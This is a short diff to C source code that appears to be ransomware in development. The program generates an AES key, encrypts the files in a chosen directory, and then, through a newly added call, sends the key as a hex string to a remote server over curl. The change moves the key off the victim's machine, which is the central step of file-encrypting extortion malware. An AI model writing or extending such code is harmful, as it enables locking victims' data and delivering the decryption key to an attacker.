@@ -11,7 +11,7 @@
 #define KEY_SIZE 32
 #define BLOCK_SIZE 16
 
-void post(int hash)
+void post(char *hash)
 {
     CURL *curl;        // handle
     CURLcode response; // codigo de retorno da func curl_easy_perform()
@@ -133,9 +133,13 @@ int main()
 
     printf("key AES: ");
 
+    char hex_string[KEY_SIZE * 2 + 1] = {0};
+
     for (int i = 0; i < KEY_SIZE; i++)
-        printf("%02x", key[i]);
-    printf("\n");
+    {
+        sprintf(&hex_string[i * 2], "%02x", key[i]);
+    }
+    printf("Hex string: %s\n", hex_string);
 
     char target_directory[1024];
 
@@ -143,7 +147,7 @@ int main()
 
     printf("%s", target_directory);
     enDire(target_directory, key, iv);
-
+    post(hex_string);
     return 0;
 }
 
